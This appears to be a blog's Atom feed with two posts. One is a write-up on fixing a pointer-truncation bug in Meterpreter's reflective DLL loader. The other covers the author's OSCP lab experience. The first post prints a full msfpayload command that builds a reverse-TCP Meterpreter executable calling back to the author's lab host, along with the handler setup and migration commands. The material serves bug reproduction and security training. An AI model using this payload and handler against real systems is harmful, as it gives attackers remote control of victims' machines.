<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[OJ's perspective]]></title>
  <link href="http://buffered.io/atom.xml" rel="self"/>
  <link href="http://buffered.io/"/>
  <updated>2013-09-14T07:30:43+10:00</updated>
  <id>http://buffered.io/</id>
  <author>
    <name><![CDATA[OJ Reeves]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[64bit Pointer Truncation in Meterpreter]]></title>
    <link href="http://buffered.io/posts/64bit-pointer-truncation-in-meterpreter/"/>
    <updated>2013-09-14T07:25:00+10:00</updated>
    <id>http://buffered.io/posts/64bit-pointer-truncation-in-meterpreter</id>
    <content type="html"><![CDATA[<p>If you haven&#8217;t ever heard of <a href="https://github.com/rapid7/meterpreter" title="Native Meterpreter">Meterpreter</a> before, you might want to go and take a look at it before reading this post to help give some context. In short, Meterpreter is an amazing library that is part of the <a href="http://www.metasploit.com/" title="Metasploit Framework">Metasploit Framework</a> and can be used to give you tremendous power and control over target machines during a <a href="http://en.wikipedia.org/wiki/Penetration_test" title="Penetration Testing">penetration test</a>. Anyone and everyone in the security game is most likely familiar with both Metasploit and Meterpreter, at the very least, if not closely intimate with them. The toolset is fantastic, and is <a href="https://github.com/rapid7/metasploit-framework/" title="Metasploit Framework Source">open source</a>!</p>

<p>I&#8217;m currently in the very fortunate position of <a href="https://community.rapid7.com/community/metasploit/blog/2013/09/05/weekly-update" title="Weekly Update: Meterpreter Updates, VMWare, the OSX spycam, Retabbing, and more!">working with the crew</a> from <a href="http://www.rapid7.com/" title="Rapid 7">Rapid7</a> to help improve Meterpreter, particularly on the Windows (both 32 and 64 bit). I have a good list of things to work through while I&#8217;m on board including making it easier to build for potential contributors, and to fix some outstanding issues that the R7 crew haven&#8217;t had the bandwidth to fix.  These people are super-smart, and super-nice and I&#8217;m honoured that I&#8217;ve been selected to work alongside them.</p>

<p>The purpose of this post is to document the process and resolution of a bug that I have helped resolve since joining. I also aim to lift the lid on Meterpreter a little and help expose how some bits of it work. I hope you enjoy.</p>

<!--more-->


<h2>Meterpreter Basics</h2>

<p>When exploiting a vulnerability during a penetration test using Metasploit, you have a number of payloads that you choose to use which give you some sort of control over your target. Of those payloads, Metepreter is not only the most common, but is probably the most powerful.</p>

<p>Once you have an instance of Metepreter running on a target, you&#8217;ve got quite a lot of control. You can escalate privileges, dump password hashes, launch processes, upload files, and you can even use it as a pivot-point for launching attacks against other non-routable hosts. While the power of all this is enough to bake anyone&#8217;s noodle, the thing that blows my mind the most is Meterpreter&#8217;s ability to migrate to other processes. That is, Meterpreter can dynamically load itself into another processes and then reconnect to your Metasploit session seamlessly without any effort from the attacker (ie. you). Simply executing <code>migrate &lt;process id&gt;</code> at the Meterpreter prompt is all it takes.</p>

<p>There are some caveats when it comes to migration. In particular, you need to have permission to write to the target process&#8217;s memory otherwise the migration will not succeed.</p>

<p>Meterpreter comes in quite a few flavours, including <code>PHP</code>, <code>Python</code>, and <code>native/C</code> for Linux and Windows. Some implementations are more feature-rich than others, but they all have common functionality which makes it easy to perform a variety of functions on a compromised host.</p>

<p>We&#8217;ll be focusing on the Windows native payload in this post, and in particular we&#8217;ll be looking at how Meterpreter is loaded and executed.</p>

<h2>Reflective DLL Injection</h2>

<p>Simply put, Reflective DLL Injection is a method for injection a DLL into a process. No surprises there. However, it has some nifty properties that make a great candidate for use in tools such as Meterpreter. Some of those points include:</p>

<ul>
<li>Position-independence.</li>
<li>Lack of host system registration.</li>
<li>Largely undetectable on the target at both a system and process level.</li>
</ul>


<p>The canonical paper [<a href="http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf" title="Reflective DLL Injection">PDF</a>], written by <a href="http://twitter.com/stephenfewer">Stephen Fewer</a>, is well worth reading and can be found on the <a href="http://harmonysecurity.com/" title="Harmony Security">Harmony Security</a> website. Read it. It&#8217;s amazing, and does a much better job of explaining itself than I could ever hope to. I would like to point out that there&#8217;s a multi-stage process involved which includes:</p>

<ul>
<li>Writing the code to an executable area of memory.</li>
<li>Executing the loader which creates a valid DLL image in memory.</li>
<li>Calling <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682583(v=vs.85).aspx" title="DllMain Entry Point">DllMain</a> on the loaded DLL.</li>
<li>Returning control to the process that invoked it.</li>
</ul>


<p>With that in mind, let&#8217;s take a look at the bug.</p>

<h2>The Bug</h2>

<p>The bug that was reported related to process migration, and went something like this (paraphrased slightly with a bit more information):</p>

<blockquote><p>Trying to migrate Metepreter between processes on Windows 2012 seems to be
unreliable. It will migrate just fine into some processes, such as <em>explorer.exe</em>,
without any problems. However, spawning another process, such as <em>notepad.exe</em>, and
migrating to it hangs the entire session. Migrating to the <em>winlogon.exe</em> process
crashes the entire user environment on the target host.</p></blockquote>

<p>When I first read this report I thought &#8220;Wow, how am I going to track this down?&#8221;, and I&#8217;ll admit that I was a little intimidated at first, especially given that I knew that the native Windows Meterpreter was using Reflective DLL Injection to load itself into other processes. However, it&#8217;s been a long time since I&#8217;d been tasked with something this challenging and so, deep down, I was looking forward to diving in.</p>

<h2>Replication</h2>

<p>The first step was to fire up a Windows 2012 virtual machine and replicate the problem. Windows 2012 only comes in a 64-bit flavour, so picking the right version wasn&#8217;t a problem.</p>

<p>After installation, I needed to simulate an attack coming from Metasploit so that I could interact with Meterpreter to perform the migration.</p>

<p>Creating a payload to do this is really simple thanks to <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload" title="msfpayload">msfpayload</a> (part of Metasploit). On my <a href="http://www.backtrack-linux.org/" title="Backtrack Linux">Backtrack</a> VM I used the following command to generate the PE image:</p>

<pre><code>root@bt:~# msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.5.26.40 LPORT=443 X &gt; 40-443-x64.exe
</code></pre>

<p>This command creates a 64-bit Windows executable that contains a small stager. This stager connects to <code>10.5.26.40</code> (my Backtrack VM) on port <code>443</code> (I always choose the HTTPS port to avoid potential outbound firewall issues). Once connected it will download the Meterpreter payload and establish a session with Metasploit.</p>

<p>I copied this binary to the Windows 2012 machine ready to execute. At this point, Metasploit needs to be set up and configured to deal with the incoming request. On the Backtrack VM, we run <code>msfconsole</code> and set it up to use <code>multi/handler</code> with the appropriate settings, like so:</p>

<pre><code>msf exploit(handler) &gt; show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
   LHOST     10.5.26.40       yes       The listen address
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
</code></pre>

<p>With those settings in place, the exploit was ready to fire:</p>

<pre><code>msf exploit(handler) &gt; exploit

[*] Started reverse handler on 10.5.26.40:443 
[*] Starting the payload handler...
</code></pre>

<p>From the Windows 2012 VM I ran the exploit binary and my Metepreter session kicked off:</p>

<pre><code>[*] Sending stage (951296 bytes) to 10.5.26.30
[*] Meterpreter session 1 opened (10.5.26.40:443 -&gt; 10.5.26.30:38516) at 2013-09-11 21:55:52 +1000

meterpreter &gt; getuid
Server username: WIN-URCAUVPE291\OJ Reeves
meterpreter &gt; sysinfo
Computer        : WIN-URCAUVPE291
OS              : Windows 2012 (Build 9200).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/win64
meterpreter &gt; 
</code></pre>

<p>Before trying the failure case, I wanted to make sure that the known success case worked locally first. I decided to migrate to <code>explorer.exe</code> and see if anything changed:</p>

<pre><code>meterpreter &gt; ps

Process List
============

 PID   PPID  Name                Arch    Session     User                       Path
 ---   ----  ----                ----    -------     ----                       ----
 0     0     [System Process]            4294967295                             
 4     0     System                      4294967295                             
 444   4     smss.exe                    4294967295                             
 484   708   svchost.exe                 4294967295                             
 536   524   csrss.exe                   4294967295                             
 604   596   csrss.exe                   4294967295                             
 612   524   wininit.exe                 4294967295                             
 640   596   winlogon.exe                4294967295                             
 692   720   explorer.exe        x86_64  1           WIN-URCAUVPE291\OJ Reeves  C:\Windows\Explorer.EXE
 708   612   services.exe                4294967295                             
 716   612   lsass.exe                   4294967295                             
 804   708   svchost.exe                 4294967295                             
 816   708   svchost.exe                 4294967295                             

... snip ...

meterpreter &gt; migrate 692
[*] Migrating from 1508 to 692...
[*] Migration completed successfully.
meterpreter &gt; getuid
Server username: WIN-URCAUVPE291\OJ Reeves
meterpreter &gt; sysinfo
Computer        : WIN-URCAUVPE291
OS              : Windows 2012 (Build 9200).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/win64
meterpreter &gt; 
</code></pre>

<p>Migration seemed to work. Next I tried the failure case. First I launched <code>notepad.exe</code> and then attempted to migrate to it:</p>

<pre><code>meterpreter &gt; execute -f notepad.exe -t -H
Process 192 created.
meterpreter &gt; migrate 192
[*] Migrating from 692 to 192...
[-] Error running command migrate: Rex::RuntimeError No response was received to the core_loadlib request.
meterpreter &gt;
</code></pre>

<p>The session hung at this point and no Meterpreter commands would work. When I went over to the Windows 2012 VM I saw that there was a notification that the notepad.exe process had crashed. This was great as I was able to reproduce the failure. It was time to investigate the problem.</p>

<h2>Diagnosis</h2>

<p>To help figure out what was going wrong, I enlisted the help of two of my favourite tools: <a href="http://technet.microsoft.com/en-au/sysinternals/bb896647.aspx" title="DebugView">DebugView</a> and <a href="http://en.wikipedia.org/wiki/WinDbg" title="Windbg">Windbg</a>. Coverage of these tools is beyond the scope of the article, so if you want to learn more about them you&#8217;ll find a stack of information out on the web. Given that this machine was 64-bit and the process we were aiming to debug was 64-bit, I installed the 64-bit version of the <a href="http://msdn.microsoft.com/en-us/windows/hardware/gg463009.aspx" title="Debugging Tools for Windows">Debugging Tools for Windows</a> so that the right version of <code>windbg</code> was available.</p>

<p>Before dabbling with any of the binaries and adding debug detail, I repeated the failure scenario but with one small change: I launched <code>notepad.exe</code> manually and attached to it from <code>windbg</code> prior to performing the migration. I left <code>DebugView</code> running as well to catch any debug messages from processes outside of the one that <code>windbg</code> was attached to.</p>

<p>Upon running the <code>migrate</code> command <code>notepad.exe</code> crashed and <code>windbg</code> caught the exception. This is what it showed:</p>

<pre><code>(ab0.448): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
00000000`707a7b5c ??              ???
</code></pre>

<p>We can see that we&#8217;re accessing memory that we shouldn&#8217;t be accessing. But why?</p>

<pre><code>0:003&gt; !analyze -v
*******************************************************************************
*                                                                             *
*                        Exception Analysis                                   *
*                                                                             *
*******************************************************************************


FAULTING_IP: 
unknown!printable+0
00000000`707a7b5c ??              ???

EXCEPTION_RECORD:  ffffffffffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 00000000707a7b5c
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 0000000000000008
   Parameter[1]: 00000000707a7b5c
Attempt to execute non-executable address 00000000707a7b5c

... snip ...
</code></pre>

<p>The migration process results in an attempt to execute a section of code in an area of memory that isn&#8217;t marked as executable. Let&#8217;s confirm that:</p>

<pre><code>0:003&gt; !vprot 00000000707a7b5c
BaseAddress:       00000000707a7000
AllocationBase:    0000000000000000
RegionSize:        000000000f839000
State:             00010000  MEM_FREE
Protect:           00000001  PAGE_NOACCESS
</code></pre>

<p>As we can see the memory area is definitely not marked as executable. But should it be? Should this memory be executable, or are we just pointing to an invalid area of memory? If it was the former, then it might imply that DEP or ASLR are somehow interfering. However, my gut feeling was that it was the latter. A quick look at the contents of the memory at this location would be enough to confirm:</p>

<pre><code>0:003&gt; du 00000000707a7b5c
00000000`707a7b5c  "????????????????????????????????"
00000000`707a7b9c  "????????????????????????????????"
00000000`707a7bdc  "????????????????????????????????"
00000000`707a7c1c  "????????????????????????????????"
00000000`707a7c5c  "????????????????????????????????"
00000000`707a7c9c  "????????????????????????????????"
00000000`707a7cdc  "????????????????????????????????"
00000000`707a7d1c  "????????????????????????????????"
00000000`707a7d5c  "????????????????????????????????"
00000000`707a7d9c  "????????????????????????????????"
00000000`707a7ddc  "????????????????????????????????"
00000000`707a7e1c  "????????????????????????????????"
</code></pre>

<p>It&#8217;s pretty clear that no valid code is located in this area of memory. This implied that there was a possibility that a pointer to an area of code is somehow going awry. But where? To find this out, I needed to add some more debug output to Meterpreter.</p>

<p>Next, I opened the Meterpreter source in Visual Studio 2012 (freshly moved from VS 2010 by yours truly) and prepared to rebuild the binaries with some extra debug output. I littered the code with <a href="http://msdn.microsoft.com/en-us/library/windows/apps/aa363362(v=vs.85).aspx" title="OutputDebugString function">OutputDebugString</a> calls at various key locations, enabled the existing logging that was built into the source, and rebuilt the suite of binaries from scratch. Once built, I deployed them to my Backtrack VM, fired up <code>DebugView</code> on the Windows 2012 VM and repeated the process (including attaching to <code>notepad.exe</code> with <code>windbg</code>). Here&#8217;s a snippet of the output:</p>

<pre><code>[SERVER] Initializing...
[SERVER] module loaded at 0x350B0000
[SERVER] main server thread: handle=0x00000138 id=0x000008F0 sigterm=0x334D7B20
[SERVER] Using SSL transport...
[SERVER] Initializing tokens...
[SERVER] Flushing the socket handle...
[SERVER] Initializing SSL...
[SERVER] Negotiating SSL...
ModLoad: 000007ff`58060000 000007ff`58075000   C:\Windows\system32\NETAPI32.DLL
ModLoad: 000007ff`586d0000 000007ff`586de000   C:\Windows\system32\netutils.dll
ModLoad: 000007ff`5b020000 000007ff`5b044000   C:\Windows\system32\srvcli.dll
ModLoad: 000007ff`58020000 000007ff`58035000   C:\Windows\system32\wkscli.dll
ModLoad: 000007ff`5ad10000 000007ff`5ad2a000   C:\Windows\system32\CRYPTSP.dll
ModLoad: 000007ff`5a990000 000007ff`5a9d9000   C:\Windows\system32\rsaenh.dll
[SERVER] Sending a HTTP GET request to the remote side...
[SERVER] Completed writing the HTTP GET request: 27
[SERVER] Registering dispatch routines...
Registering a new command (core_loadlib)...
Allocated memory...
Setting new command...
Fixing next/prev...
Done...
[SERVER] Entering the main server dispatch loop for transport 0...
[DISPATCH] entering server_dispatch( 0x334D7B60 )
[SCHEDULER] entering scheduler_initialize.
[SCHEDULER] leaving scheduler_initialize.
[DISPATCH] created command_process_thread 0x33523030, handle=0x000001F0
[COMMAND] Processing method core_loadlib
[COMMAND] core_loadlib: Entry
[COMMAND] core_loadlib: libraryPath (ext264209.x64.dll) flags (2)
[COMMAND] core_loadlib: lib does not exist locally (being uploaded)
[COMMAND] core_loadlib: lib is not to be stored on disk
[LOADLIBRARYR] starting
[LOADLIBRARYR] GetReflectiveLoaderOffset
[LOADLIBRARYR] GetReflectiveLoaderOffset (5488)
[LOADLIBRARYR] Calling VirtualProtect lpBuffer (0000008935318B20) length (428544)
[LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
ModLoad: 000007ff`555e0000 000007ff`55600000   C:\Windows\system32\WINMM.dll
ModLoad: 000007ff`555a0000 000007ff`555d2000   C:\Windows\system32\WINMMBASE.dll
ModLoad: 000007ff`57e00000 000007ff`57e2c000   C:\Windows\system32\IPHLPAPI.DLL
ModLoad: 000007ff`57de0000 000007ff`57dea000   C:\Windows\system32\WINNSI.DLL
[LOADLIBRARYR] Calling pDllMain (0000000033449BEC)
(9b8.968): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
00000000`33449bec ??              ???
</code></pre>

<p>The extra debug calls that I added to the source are those marked with <code>[LOADLIBRARYR]</code>. These calls were located in the guts of the reflective DLL injection code.</p>

<p>As we already know from earlier in this post, the reflective DLL injection code dynamically builds a valid DLL image in memory and then invokes it. The method which builds this DLL image is called <code>ReflectiveLoader()</code> and is invoked in code via a pointer called <code>pReflectiveLoader</code>, which you can see in the above output. At the end of the <code>ReflectiveLoader()</code> function, a reference to <code>DllMain()</code> is resolved and invoked directly prior to returning control to the caller.</p>

<p>Once this function returns, the Meterpreter-specific code then calls <code>DllMain()</code> again, using the value returned from <code>ReflectiveLoader()</code>, to invoke some functionality required by the Metasploit framework. In the above output, you can see the pointer to <code>DllMain()</code> called <code>pDllMain</code>, and this is the pointer that&#8217;s used to make the call.</p>

<p>What was interesting about the log is that the first call to <code>DllMain()</code> that is invoked in the body of <code>ReflectiveLoader()</code> worked fine, otherwise the process would have crashed prior to the line that outputs the value of the <code>pDllMain</code> variable. Instead, it was the <em>second</em> call to <code>DllMain()</code> via the <code>pDllMain</code> pointer that caused the crash. This implied that the memory address that was being returned from <code>ReflectiveLoader()</code> was incorrect.</p>

<p>The nature of the reflective loading mechanism implied to me that the addresses of <code>pReflectiveLoader</code> and <code>pDllMain</code> should actually be quite close together in memory. However, focussing on a small part of the output, I noticed the following:</p>

<pre><code>[LOADLIBRARYR] Calling pReflectiveLoader (000000893531A090)
[LOADLIBRARYR] Calling pDllMain          (0000000033449BEC)
</code></pre>

<p>Those two pointers were nowhere near each other! The more perceptive of you will have noticed that the <code>pDllMain</code> pointer appeared to have lost its higher-order <a href="http://msdn.microsoft.com/en-us/library/cc230318.aspx" title="DWORD">DWORD</a>. The pointer had in fact been truncated!</p>

<p>But why? It wasn&#8217;t immediately obvious to me what the reason was, but I was keen to validate that this was the case. To prove my theory, I hacked the code a little so that the higher-order DWORD of the <code>pReflectiveLoader</code> value was used as the higher-order DWORD of <code>pDllMain</code> as well. The hack looked something like this:</p>

<pre><code>ULONG_PTR ulReflectiveLoaderBase = ((ULONG_PTR)pReflectiveLoader) &amp; (((ULONG_PTR)-1) ^ (0xFFFFFFFF));
pDllMain = (DLLMAIN)(pReflectiveLoader() | ulReflectiveLoaderBase);
</code></pre>

<p>After the above code, <code>pDllMain</code> would have the same higher-order DWORD value as <code>pReflectiveLoader</code>. I compiled, deployed, executed &#8230;</p>

<p>&#8230; and it worked!</p>

<h2>Resolution</h2>

<p>Armed with the knowledge earned from the above diagnosis, I set about looking through the code to see why this pointer was being truncated. Clearly the value was perfectly fine prior to being returned from <code>ReflectiveLoader()</code>, so why was it truncated upon return?</p>

<p>I spent quite a bit of time looking around, and I didn&#8217;t find anything. Nothing was leaping out at me. I felt really stupid. So instead of beating about the bush, I contacted the man himself, the author and creator of Reflective DLL Injection himself, Mr <a href="http://twitter.com/stephenfewer">Stephen Fewer</a>. I explained the situation to him, detailed my findings and asked if he any idea as to why this problem might be occurring.</p>

<p>It didn&#8217;t take long to get a response. Stephen jumped on the issue straight away, fixed it and submitted a <a href="https://github.com/rapid7/meterpreter/pull/14">pull request</a> to the Meterpreter repository before emailing me back with details of the solution. Talk about great service!</p>

<p>When I saw the solution I immediately felt stupid for missing it myself. In hindsight I should have known to look in this location. I ate some humble pie and savoured the taste while expressing my gratitude to Stephen for his prompt response.</p>

<p>So what was it?</p>

<p>The <code>pReflectiveLoader</code> pointer is a function pointer of a type defined like so:</p>

<pre><code>typedef DWORD (WINAPI * REFLECTIVELOADER)( VOID );
</code></pre>

<p>However, the <code>ReflectiveLoader()</code> function was defined in the source like so:</p>

<pre><code>#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( LPVOID lpParameter )
#else
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
#endif
{
    // ... lots of code
}
</code></pre>

<p>So the function returns a <a href="http://msdn.microsoft.com/en-us/library/cc230394.aspx" title="ULONG_PTR">ULONG_PTR</a> (which is 64-bits) but the function pointer type returned a <a href="http://msdn.microsoft.com/en-us/library/cc230318.aspx" title="DWORD">DWORD</a> (which is 32-bits). This is what was causing the truncation of the pointer and effectively zeroing out the higher-order DWORD of <code>pDllMain</code>. The fix was to simply change the return type of the function pointer to match:</p>

<pre><code>typedef ULONG_PTR (WINAPI * REFLECTIVELOADER)( VOID );
</code></pre>

<p>Problem solved.</p>

<h2>Extra Thoughts and Conclusion</h2>

<p>For those of you who are wondering, like I was, why this was an intermittent problem the answer lies in the fact that the new versions of Windows have newer versions of <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization" title="Adress Space Layout Randomisation">ASLR</a>. To quote Stephen:</p>

<blockquote><p>The bug was triggering on Server 2012 but not other 64bit systems
probably due to high entropy ASLR making allocations over the 4gig boundary.</p></blockquote>

<p>Earlier versions of Windows didn&#8217;t have an ASLR implementation that resulted in memory allocations over the 4GB boundary. As a result, the higher-order DWORD was always zero anyway, which meant that the truncation had no impact.</p>

<p>This was a really fun bug to analyse and track down. I&#8217;m glad we got to the bottom of it. Again I&#8217;d like to thank Stephen for his involvement in locating the source of the problem.</p>

<p>The new and improved version of Meterpreter that contains this fix will be landing in Metasploit very soon (I hope). Thanks for reading. Comments and feedback are welcomed.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OSCP and Me]]></title>
    <link href="http://buffered.io/posts/oscp-and-me/"/>
    <updated>2013-08-16T20:33:00+10:00</updated>
    <id>http://buffered.io/posts/oscp-and-me</id>
    <content type="html"><![CDATA[<p>The <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack/" title="Penetration Testing with BackTrack">PWB</a> course by <a href="http://www.offensive-security.com/" title="Offensive Security">Offensive Security</a> is absolutely awesome, as is the exam which earns you the prized <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional">OSCP</a> certification. I took this course and exam recently; I loved it and I nailed it! I am now equipped with a much better understanding of the security world and am in a better position to help businesses improve the security of their application architecture and infrastructure.</p>

<p><a href="http://buffered.io/contact" title="Contact OJ">Hit me up</a> and let&#8217;s talk about how I can help you make your applications more secure.</p>

<p>What follows is the full story of my path through PWB and OSCP. Enjoy.</p>

<!--more-->


<h2>The Long Version</h2>

<p>I started developing software professionally back in 1999, just shy of 15 years ago. Since then I&#8217;ve been fortunate enough to work in some pretty amazing domains, used a massive variety of technologies and have played a part in some <a href="http://burnoutrevenge.ea.com/360/player.asp?language=en" title="Burnout Revenge for Xbox 360">pretty</a> <a href="https://internetbanking.suncorpbank.com.au/" title="Suncorp Internet Banking">awesome</a> <a href="http://www.innovation.gov.au/Industry/Defence/CapabilityDirectories/Documents/JSFCapabilityDirectory/company%20profiles/ball_solutions/profile_3.html" title="Mission Data Planning Environment">software</a>. I&#8217;m proud of what I&#8217;ve achieved so far. However I&#8217;ve recently found myself looking for a new challenge. Something that will make me think, push me to learn new things, and hopefully keep my motivation levels up to a high level. Ultimately, I wanted to have a bit of a career change without really changing my career.</p>

<p>Towards the end of last year, after some careful deliberation, I decided to follow a long-term passion of mine with a goal of incorporating it into my work. That passion is <a href="http://en.wikipedia.org/wiki/Information_security" title="Information Security">Information Security</a>. Infosec as a domain is made up of a <em>lot</em> of different areas, and hence making it a point of focus means that anyone looking to get involved needs to first learn the basics of a broad set of topics and then, perhaps, <em>specialise</em> in one of them.</p>

<p>For many years I&#8217;ve <a href="http://buffered.io/categories/rce/" title="Category: RCE">dabbled with reverse engineering</a>, kept up-to-date with various security topics, and have been quite a <a href="http://buffered.io/posts/xss-flaws-via-mvc-model-binding-and-request.querystring-inconsistencies/" title="XSS Flaws via MVC Model Binding and Request.QueryString Inconsistencies">security-minded developer</a>. I didn&#8217;t want to just go and read up on the things that I already knew, but instead I wanted to throw myself in the deep end into an area that I wasn&#8217;t too familiar with but had a keen interest in.</p>

<p>This led me to <a href="http://en.wikipedia.org/wiki/Penetration_test" title="Penetration Test">penetration testing</a> and ultimately to <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional">OSCP</a>.</p>

<h2>Exploring OSCP</h2>

<p>I spent quite a bit of time searching for courses and material that would get me going with the basics of penetration testing servers and web applications. There&#8217;s quite a lot out there, though much of it is rudimentary, is disjoint or lacks cohesion, or talks about &#8220;point and shoot&#8221; exploitation. While this might be helpful in becoming a <a href="http://en.wikipedia.org/wiki/Script_kiddie" title="Script Kiddie">script kiddie</a> it wasn&#8217;t what I was looking for. I wanted to be challenged.</p>

<p>When I stumbled on <a href="http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/" title="Offensive Security Certified Professional">OSCP</a> I was initially dubious as I am when it comes to any certification. Most developers out there are probably experienced with the certifications that exist in the world of software engineering and how they do not provide an indication of a person&#8217;s ability. Before knowing better I assumed this would be the same.</p>

<p>However, after <a href="http://proactivedefender.blogspot.com/2012/01/oscp-my-review.html">reading</a> <a href="http://www.hackyeah.com/2010/12/brief-review-of-the-pwb-class-and-the-oscp-certification/">some</a> <a href="http://blog.nullmode.com/2013/05/penetration-testing-with-backtrack-oscp.html">reviews</a> from people who have achieved the certification, I started to realise that this is exactly the kind of thing I was looking for.</p>

<p>Quotes from these reviews include lines such as:</p>

<blockquote><p>The truism &#8220;anything worth having doesn&#8217;t come easy&#8221; is one I have often remembered when on a particularly difficult path to a goal. Never have the words rung quite so true when applied to my quest for [the] OSCP certification.</p></blockquote>

<p>Others state:</p>

<blockquote><p>The OSCP certification, in my opinion, proves that it&#8217;s holder is able to identify vulnerabilities, create and modify exploit code, exploit hosts, and successfully preform tasks on the compromised systems over various operating systems.</p></blockquote>

<p>I was becoming convinced that OSCP was something that I had to do, despite not ever doing any form of penetration testing in the past (other than fumbling around my own web applications). At this point I reached out to a local security professional, <a href="http://security.crudtastic.com/" title="Security with added Cheese">Ash D</a> who is a seasoned Infosec guru, SANS mentor/teacher and who has passed the exam himself, and bribed him with a free lunch to come and talk to me about his experience. He turned out to be friendly, fun, informative and gave me just the confirmation I was looking for. Even if I failed miserably I&#8217;d already made a good friend out of the experience (a friend who later would keep encouraging me right through to the end <a href="http://security.crudtastic.com/?p=699">and beyond</a>, thanks Ash).</p>

<p>OSCP requires you to spend a lot of time in a virtual lab practising the various techniques that you&#8217;ll need to master to do well in the exam. While the learning material from Offensive Security is good (more on this later), the lab is what makes the whole thing <strong>great</strong>. This was the last key point for me. I wasn&#8217;t just going to learn theory, I would actually learn to <em>do</em> things and have to <em>demonstrate</em> that in the exam to gain the certification.</p>

<h2>Getting Started</h2>

<p>It was early 2013 and I was working some longer hours for various clients which made it hard for me to find the time to put into some basic preparation. As a result it took me quite a while to sign up for the course as I wanted to make sure that I would be able to give it the time it deserves.</p>

<p>As April 2013 approached I came to the realisation that it was <em>never</em> a good time to sign up for something like this and hence I should just go and make it happen. I spoke to my wife and kids about it and made sure they were OK with the idea of me being locked away to learn, and they gave me their full support (short interlude: my family is awesome).</p>

<p>I jumped on the web and went to the <a href="http://www.offensive-security.com/information-security-training/penetration-testing-with-backtrack/" title="PWB sign up">sign-up</a> page and was presented with quite a few options. I needed to specify how much lab time I wanted prior to my exam. This was a bit like telling a mobile phone carrier how many calls you&#8217;re going to make; I really wasn&#8217;t sure! Instead of deliberating for too long, I decided to go with the 30-day option and extend my time if I felt that I needed more. No big deal.</p>

<p>I signed up for the course, and locked in the date of June 16th to kick off my time in the labs.I was really excited, and couldn&#8217;t wait for it to start. In the following days I was contacted by Offsec and asked for proof of identity. Offsec require that you don&#8217;t use a &#8220;free&#8221; email address such as Gmail when signing up, however I don&#8217;t have any email addresses that aren&#8217;t Google Apps hosted (this will change soon) and hence I needed to verify my identity with them. This goes to show that they don&#8217;t just let any unknown person take up the course to learn things which can easily be misused.</p>

<p>After what felt like an eternity, June 16th came around and my connection pack arrived in my inbox. Unfortunately for me, work and a few other things took over and I lost the first week of time. I was able to connect to the labs on the odd occasion but for very short periods of time. Given that I wasn&#8217;t yet across the material that time I spent in the labs wasn&#8217;t really fruitful.</p>

<p>At day 8 things finally settled down to a level where I was able to dive into the material and begin fumbling my way through the lab. This is where things really started to become entertaining.</p>

<h2>Initial Lab Time</h2>

<p>My first few days in the lab were interesting. I popped the SYSTEM account on one of the Windows boxes in the first 4 hours of my lab time. This was not only surprising but it gave me a confidence boost which didn&#8217;t do me any favours. From there I failed repeatedly to compromise another machine. The second day yielded no results. The third day was also fruitless. By the end of the fourth day, when I still had just <em>one</em> machine on my tally, I was beginning to ask myself questions. Am I cut out for this? Have I bitten off more than I can chew?</p>

<p>I stepped back for a while and pondered my approach. I realised that I wasn&#8217;t thinking and looking to learn. I wasn&#8217;t approaching the problems like a hacker would. I wasn&#8217;t doing enumeration properly. I was investing too much time looking for out-of-the-box exploits rather than trying to connect the dots myself. I gave myself a slap, and started again.</p>

<p>This is when things started to change. Machines started to fall. I started to learn more. I improved in all the areas I was failing at before. It was wonderful.</p>

<p>On the fifth day I managed to pop 7 machines. What a difference!</p>

<h2>Proper Lab Time</h2>

<p><em>Note: my coverage of the lab from here is &#8220;point in time&#8221;. Offsec change and upgrade the lab all the time, and hence details of the lab and what you&#8217;ll experience will change over time too.</em></p>

<p>The lab was a wonderful place to play, practice and learn. I was constantly blown away by the mixture of operating systems, patch levels, kernel versions, system application and feature versions, third-party applications, and even custom applications that had been built which emulated the kind of things you&#8217;d expect a developer to throw together to help them do something a little easier and quicker as part of their day job. The effort that has gone into the design and set up of the lab environment is commendable. It really felt like I was in a real network with real machines and real people using those machines.</p>

<p>It was made up of approximately 60 machines partitioned into a number of networks. Each machine has it&#8217;s own identity and story, some are interesting and some not so much. I&#8217;m not going to elaborate on the detail too much because discovering that is all part of the fun. But I will say that I experienced <code>Pain</code> and <code>Sufference</code> [sic] in ways I didn&#8217;t expect.</p>

<p>The networks are connected together in interesting ways, and you as the penetration tester will need to work your way through the machines and networks, pivoting your attacks off compromised hosts as you go with the end goal of compromising all of the hosts and making it to the <strong>Admin</strong> network.</p>

